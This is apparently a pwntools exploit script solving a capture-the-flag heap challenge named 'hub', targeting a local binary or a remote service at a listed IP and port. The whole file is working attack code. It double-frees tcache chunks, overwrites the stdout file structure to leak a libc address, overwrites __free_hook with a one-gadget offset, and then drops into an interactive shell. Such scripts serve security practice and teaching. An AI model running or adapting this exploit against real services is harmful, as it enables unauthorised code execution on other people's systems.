#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file="./hub_2bcab892e2e5b54edbef4ccecd6f373f"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("47.112.139.218", 13132)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    gdb.attach(r, "p &_IO_2_1_stdout_")
    #pause()

def add(size):
    #r.sendlineafter(">>", '1')
    r.sendlineafter("Quit", '1')
    r.sendlineafter("stay?", str(size))

def dele(idx):
    #r.sendlineafter(">>", '2')
    r.sendlineafter("Quit", '2')
    r.sendlineafter("want?", str(idx))

def edit(data):
    #r.sendlineafter(">>", '3')
    r.sendlineafter("Quit", '3')
    r.sendafter("want?", data)

add(0x10)
dele(0)
dele(0)
add(0x10)
edit(p64(0x602020))
add(0x10)
add(0x10)
edit('\x80')
add(0x10)
edit(p64(0xfbad1800))

add(0x20)
dele(0)
dele(0)
add(0x20)
edit(p64(0x602020))
add(0x20)
add(0x20)
add(0x20)
edit('\x00')

r.recv(8)
a = u64(r.recv(8)) - 0x3ed8b0
info("libc: "+hex(a))
libc.address = a

add(0x40)
dele(0)
dele(0)
add(0x40)
edit(p64(libc.sym['__free_hook']))
add(0x40)
add(0x40)
edit(p64(a+0x4f322))

dele(0)

r.interactive()
